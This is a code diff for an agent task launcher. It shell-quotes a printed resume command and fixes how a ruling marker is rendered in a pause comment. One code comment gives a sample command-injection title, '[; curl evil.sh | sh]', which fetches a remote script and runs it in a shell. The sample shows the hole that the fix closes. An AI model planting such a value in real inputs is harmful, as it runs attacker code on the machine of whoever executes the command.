@@ -21,6 +21,7 @@ import {
   markEffectUncertain,
   parseTaskBranchIdentity,
   type PauseReason,
+  principalRulingMarker,
   readEscalation,
   readResolution,
   type RequestedAuthority,
@@ -241,9 +242,32 @@ export function noPushResumeArgv(task: number, branch: string, agent?: string, m
   return [...address, ...(agent ? ['--agent', agent] : []), ...(model ? ['--model', model] : [])]
 }
 
-/** `task-status.ts`'s `resumeCommandFor` for the case where there is no pull request to anchor a `--resume` to: the one continuation a before-any-push pause actually has, rendered from `noPushResumeArgv` so the pause comment here and `task-tools/read.ts`'s `permittedNextActions` name the identical command the launcher runs. */
+/** A token that needs no shell quoting at all — the shape every real tranche slug, agent and model already has. */
+const SHELL_SAFE_TOKEN = /^[A-Za-z0-9._@%+=:,/-]+$/
+
+/**
+ * One argv element, rendered so a shell runs it as exactly that element.
+ *
+ * This matters because the tranche segment is UNVALIDATED forge input, not a
+ * slug this code chose: `developerBranchFor` takes it from the task Issue's
+ * own title (`ISSUE_TITLE_SHAPE`'s `[^\]]+`) and `parseTaskBranchIdentity`
+ * accepts any `[^/]+`, so a title like `[; curl evil.sh | sh] 22 — x` would
+ * otherwise be interpolated verbatim into a fenced command block this comment
+ * tells a human — or an Operator agent — to run. The spawned argv was always
+ * safe (an array, no shell), which is exactly why the printed form has to be
+ * the shell ENCODING of that array rather than a space-join of it: anything
+ * else is a second, weaker builder pretending to be the same one. Single
+ * quotes with `'\''` escaping is the POSIX-complete form — it also fixes the
+ * plain-whitespace case, where a space-join silently produced a different
+ * command than the one that runs.
+ */
+function shellQuote(token: string): string {
+  return SHELL_SAFE_TOKEN.test(token) ? token : `'${token.replaceAll("'", "'\\''")}'`
+}
+
+/** `task-status.ts`'s `resumeCommandFor` for the case where there is no pull request to anchor a `--resume` to: the one continuation a before-any-push pause actually has. Rendered from `noPushResumeArgv` — the identical argv `task_resume` spawns — shell-quoted element by element, so the pause comment here, `task-tools/read.ts`'s `permittedNextActions` and the launcher all name one command and a hostile tranche segment cannot turn the printed form into something else. */
 export function noPushResumeCommandFor(task: number, branch: string, agent?: string, model?: string): string {
-  return `vinaya ${noPushResumeArgv(task, branch, agent, model).join(' ')}`
+  return `vinaya ${noPushResumeArgv(task, branch, agent, model).map(shellQuote).join(' ')}`
 }
 
 /**
@@ -273,15 +297,21 @@ export function renderNoPushStopComment(
   invocation?: { agent: string; model?: string },
   rulingOrdinal?: number
 ): string {
+  // Built by `principalRulingMarker`, never interpolated here: the ordinal the
+  // gates compare is the marker's SECOND number (`<ref>-<ordinal>`), and a
+  // hand-written template that put it first rendered a marker parsing as
+  // ordinal `1` forever — so a ruling written exactly as this comment
+  // instructed failed the very gate it was posted to satisfy, for every pause
+  // whose recorded baseline had reached `1`.
   const nextOrdinal = (rulingOrdinal ?? 0) + 1
   return [
     `The dev-review-loop paused: ${reason}${detail ? ` — ${detail}` : ''}.`,
     '',
     'No pull request exists yet for this task, so the pause is recorded on this Issue instead.',
-    'A Principal ruling is needed before this can continue. Post it as a comment on this Issue whose FIRST line is the ruling marker, with an ordinal higher than the one this pause recorded:',
+    'A Principal ruling is needed before this can continue. Post it as a comment on this Issue whose FIRST line is exactly this marker — the second number is the ordinal, and it must exceed the one this pause recorded:',
     '',
     '```',
-    `<!-- aeg:principal:ruling:${nextOrdinal}-1 -->`,
+    principalRulingMarker(task, nextOrdinal),
     'Your ruling text here.',
     '```',
     '',
